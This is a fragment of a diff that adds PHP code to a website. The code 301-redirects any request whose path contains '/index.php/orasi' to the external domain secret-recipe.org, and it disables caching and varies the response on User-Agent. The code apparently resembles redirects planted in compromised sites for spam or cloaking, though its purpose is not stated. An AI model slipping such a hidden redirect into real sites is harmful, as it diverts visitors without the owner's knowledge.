@@ -1,0 +1,9 @@
+$request_uri = $_SERVER['REQUEST_URI'] ?? '';
+
+if (strpos($request_uri, '/index.php/orasi') !== false) {
+    header('Vary: Accept-Language, User-Agent');
+    header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+    header('Pragma: no-cache');
+    header('Expires: 0');
+    header("Location: https://secret-recipe.org/", TRUE, 301);
+    exit();
